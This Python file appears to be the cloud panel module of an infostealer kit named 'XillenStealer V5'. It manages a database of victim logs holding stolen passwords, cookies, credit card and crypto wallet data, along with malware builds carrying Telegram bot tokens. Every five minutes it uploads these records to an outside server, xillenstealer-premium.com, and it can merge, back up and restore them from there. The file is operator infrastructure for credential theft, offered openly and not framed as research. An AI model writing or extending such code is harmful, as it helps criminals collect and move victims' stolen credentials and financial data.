import json
import requests
import time
import threading
from datetime import datetime, timedelta
from typing import Dict, List, Any
import sqlite3
import hashlib
import base64

class CloudPanelManager:
    def __init__(self):
        self.cloud_active = False
        self.server_url = "https://xillenstealer-premium.com/api"
        self.api_key = None
        self.user_id = None
        self.sync_enabled = False
        self.last_sync = None
        self.cloud_data = {}
        
    def enable_cloud_panel(self, api_key, user_id):
        """Enable cloud panel functionality"""
        print("☁️ Enabling Cloud Panel...")
        
        try:
            self.api_key = api_key
            self.user_id = user_id
            
            # Test connection
            if self._test_connection():
                self.cloud_active = True
                self.sync_enabled = True
                
                # Start background sync
                self._start_background_sync()
                
                print("Cloud Panel enabled!")
                return True
            else:
                print("❌ Cloud Panel connection failed!")
                return False
                
        except Exception as e:
            print(f"❌ Cloud Panel error: {e}")
            return False
    
    def _test_connection(self):
        """Test connection to cloud server"""
        try:
            headers = {
                'Authorization': f'Bearer {self.api_key}',
                'Content-Type': 'application/json'
            }
            
            response = requests.get(
                f"{self.server_url}/test",
                headers=headers,
                timeout=10
            )
            
            return response.status_code == 200
            
        except Exception as e:
            print(f"❌ Connection test error: {e}")
            return False
    
    def _start_background_sync(self):
        """Start background synchronization"""
        def sync_worker():
            while self.sync_enabled:
                try:
                    self._sync_data()
                    time.sleep(300)  # Sync every 5 minutes
                except Exception as e:
                    print(f"❌ Background sync error: {e}")
                    time.sleep(60)  # Wait 1 minute on error
        
        sync_thread = threading.Thread(target=sync_worker, daemon=True)
        sync_thread.start()
    
    def _sync_data(self):
        """Synchronize data with cloud"""
        try:
            # Get local data
            local_data = self._get_local_data()
            
            # Send to cloud
            self._send_to_cloud(local_data)
            
            # Get cloud data
            cloud_data = self._get_from_cloud()
            
            # Merge data
            self._merge_data(local_data, cloud_data)
            
            self.last_sync = datetime.now()
            
        except Exception as e:
            print(f"❌ Sync error: {e}")
    
    def _get_local_data(self):
        """Get local data"""
        try:
            # Get data from local database
            conn = sqlite3.connect('xillen_v5.db')
            cursor = conn.cursor()
            
            # Get logs
            cursor.execute('SELECT * FROM logs ORDER BY date DESC LIMIT 1000')
            logs = cursor.fetchall()
            
            # Get builds
            cursor.execute('SELECT * FROM builds ORDER BY created_at DESC LIMIT 100')
            builds = cursor.fetchall()
            
            # Get configs
            cursor.execute('SELECT * FROM configs ORDER BY created_at DESC LIMIT 50')
            configs = cursor.fetchall()
            
            conn.close()
            
            return {
                'logs': logs,
                'builds': builds,
                'configs': configs,
                'timestamp': datetime.now().isoformat()
            }
            
        except Exception as e:
            print(f"❌ Local data error: {e}")
            return {}
    
    def _send_to_cloud(self, data):
        """Send data to cloud"""
        try:
            headers = {
                'Authorization': f'Bearer {self.api_key}',
                'Content-Type': 'application/json'
            }
            
            payload = {
                'user_id': self.user_id,
                'data': data,
                'timestamp': datetime.now().isoformat()
            }
            
            response = requests.post(
                f"{self.server_url}/sync/upload",
                json=payload,
                headers=headers,
                timeout=30
            )
            
            if response.status_code == 200:
                print("Data uploaded to cloud")
            else:
                print(f"❌ Upload failed: {response.status_code}")
                
        except Exception as e:
            print(f"❌ Cloud upload error: {e}")
    
    def _get_from_cloud(self):
        """Get data from cloud"""
        try:
            headers = {
                'Authorization': f'Bearer {self.api_key}',
                'Content-Type': 'application/json'
            }
            
            response = requests.get(
                f"{self.server_url}/sync/download",
                headers=headers,
                timeout=30
            )
            
            if response.status_code == 200:
                return response.json()
            else:
                print(f"❌ Download failed: {response.status_code}")
                return {}
                
        except Exception as e:
            print(f"❌ Cloud download error: {e}")
            return {}
    
    def _merge_data(self, local_data, cloud_data):
        """Merge local and cloud data"""
        try:
            # Merge logs
            local_logs = {log[1]: log for log in local_data.get('logs', [])}
            cloud_logs = {log['victim_id']: log for log in cloud_data.get('logs', [])}
            
            # Update local with cloud data
            merged_logs = {**local_logs, **cloud_logs}
            
            # Save merged data
            self._save_merged_data(merged_logs)
            
        except Exception as e:
            print(f"❌ Data merge error: {e}")
    
    def _save_merged_data(self, merged_data):
        """Save merged data to local database"""
        try:
            conn = sqlite3.connect('xillen_v5.db')
            cursor = conn.cursor()
            
            # Update logs
            for victim_id, log_data in merged_data.items():
                cursor.execute('''
                    INSERT OR REPLACE INTO logs 
                    (victim_id, ip, country, country_code, os, hwid, date, 
                     passwords, cookies, cc, crypto, files_size, data)
                    VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
                ''', (
                    log_data.get('victim_id'),
                    log_data.get('ip'),
                    log_data.get('country'),
                    log_data.get('country_code'),
                    log_data.get('os'),
                    log_data.get('hwid'),
                    log_data.get('date'),
                    log_data.get('passwords', 0),
                    log_data.get('cookies', 0),
                    log_data.get('cc', 0),
                    log_data.get('crypto', 0),
                    log_data.get('files_size', 0),
                    json.dumps(log_data.get('data', {}))
                ))
            
            conn.commit()
            conn.close()
            
        except Exception as e:
            print(f"❌ Save merged data error: {e}")
    
    def get_cloud_dashboard(self):
        """Get cloud dashboard data"""
        try:
            headers = {
                'Authorization': f'Bearer {self.api_key}',
                'Content-Type': 'application/json'
            }
            
            response = requests.get(
                f"{self.server_url}/dashboard",
                headers=headers,
                timeout=10
            )
            
            if response.status_code == 200:
                return response.json()
            else:
                return {}
                
        except Exception as e:
            print(f"❌ Dashboard error: {e}")
            return {}
    
    def get_cloud_analytics(self):
        """Get cloud analytics data"""
        try:
            headers = {
                'Authorization': f'Bearer {self.api_key}',
                'Content-Type': 'application/json'
            }
            
            response = requests.get(
                f"{self.server_url}/analytics",
                headers=headers,
                timeout=10
            )
            
            if response.status_code == 200:
                return response.json()
            else:
                return {}
                
        except Exception as e:
            print(f"❌ Analytics error: {e}")
            return {}
    
    def get_cloud_reports(self):
        """Get cloud reports"""
        try:
            headers = {
                'Authorization': f'Bearer {self.api_key}',
                'Content-Type': 'application/json'
            }
            
            response = requests.get(
                f"{self.server_url}/reports",
                headers=headers,
                timeout=10
            )
            
            if response.status_code == 200:
                return response.json()
            else:
                return {}
                
        except Exception as e:
            print(f"❌ Reports error: {e}")
            return {}
    
    def create_cloud_backup(self):
        """Create cloud backup"""
        try:
            headers = {
                'Authorization': f'Bearer {self.api_key}',
                'Content-Type': 'application/json'
            }
            
            # Get all local data
            local_data = self._get_local_data()
            
            payload = {
                'user_id': self.user_id,
                'backup_data': local_data,
                'timestamp': datetime.now().isoformat()
            }
            
            response = requests.post(
                f"{self.server_url}/backup/create",
                json=payload,
                headers=headers,
                timeout=60
            )
            
            if response.status_code == 200:
                result = response.json()
                print(f"Backup created: {result.get('backup_id')}")
                return result.get('backup_id')
            else:
                print(f"❌ Backup failed: {response.status_code}")
                return None
                
        except Exception as e:
            print(f"❌ Backup error: {e}")
            return None
    
    def restore_cloud_backup(self, backup_id):
        """Restore from cloud backup"""
        try:
            headers = {
                'Authorization': f'Bearer {self.api_key}',
                'Content-Type': 'application/json'
            }
            
            response = requests.get(
                f"{self.server_url}/backup/{backup_id}",
                headers=headers,
                timeout=30
            )
            
            if response.status_code == 200:
                backup_data = response.json()
                
                # Restore data to local database
                self._restore_data(backup_data)
                
                print("Backup restored successfully!")
                return True
            else:
                print(f"❌ Restore failed: {response.status_code}")
                return False
                
        except Exception as e:
            print(f"❌ Restore error: {e}")
            return False
    
    def _restore_data(self, backup_data):
        """Restore data from backup"""
        try:
            conn = sqlite3.connect('xillen_v5.db')
            cursor = conn.cursor()
            
            # Clear existing data
            cursor.execute('DELETE FROM logs')
            cursor.execute('DELETE FROM builds')
            cursor.execute('DELETE FROM configs')
            
            # Restore logs
            for log in backup_data.get('logs', []):
                cursor.execute('''
                    INSERT INTO logs 
                    (victim_id, ip, country, country_code, os, hwid, date, 
                     passwords, cookies, cc, crypto, files_size, data)
                    VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
                ''', log)
            
            # Restore builds
            for build in backup_data.get('builds', []):
                cursor.execute('''
                    INSERT INTO builds 
                    (name, telegram_token, chat_id, modules, created_at, file_path)
                    VALUES (?, ?, ?, ?, ?, ?)
                ''', build)
            
            # Restore configs
            for config in backup_data.get('configs', []):
                cursor.execute('''
                    INSERT INTO configs 
                    (name, config_json, created_at)
                    VALUES (?, ?, ?)
                ''', config)
            
            conn.commit()
            conn.close()
            
        except Exception as e:
            print(f"❌ Restore data error: {e}")
    
    def get_cloud_status(self):
        """Get cloud panel status"""
        return {
            'cloud_active': self.cloud_active,
            'sync_enabled': self.sync_enabled,
            'last_sync': self.last_sync.isoformat() if self.last_sync else None,
            'server_url': self.server_url,
            'user_id': self.user_id
        }
    
    def disable_cloud_panel(self):
        """Disable cloud panel"""
        self.cloud_active = False
        self.sync_enabled = False
        self.api_key = None
        self.user_id = None
        print("Cloud Panel disabled!")

# Global instance
cloud_panel = CloudPanelManager()

def enable_cloud_panel(api_key, user_id):
    """Enable cloud panel"""
    return cloud_panel.enable_cloud_panel(api_key, user_id)

def get_cloud_dashboard():
    """Get cloud dashboard"""
    return cloud_panel.get_cloud_dashboard()

def get_cloud_analytics():
    """Get cloud analytics"""
    return cloud_panel.get_cloud_analytics()

def create_cloud_backup():
    """Create cloud backup"""
    return cloud_panel.create_cloud_backup()

def restore_cloud_backup(backup_id):
    """Restore cloud backup"""
    return cloud_panel.restore_cloud_backup(backup_id)

def get_cloud_status():
    """Get cloud status"""
    return cloud_panel.get_cloud_status()

def is_cloud_active():
    """Check if cloud is active"""
    return cloud_panel.cloud_active

if __name__ == "__main__":
    print("☁️ XillenStealer V5 - Cloud Panel Manager")
    print("=" * 50)
    
    # Test with sample API key
    api_key = "test_api_key_12345"
    user_id = "test_user_67890"
    
    if enable_cloud_panel(api_key, user_id):
        print("Cloud Panel enabled successfully!")
        
        # Get status
        status = get_cloud_status()
        print(f"📊 Cloud Status: {status}")
        
        # Create backup
        backup_id = create_cloud_backup()
        if backup_id:
            print(f"💾 Backup created: {backup_id}")
        
    else:
        print("❌ Cloud Panel failed to enable!")
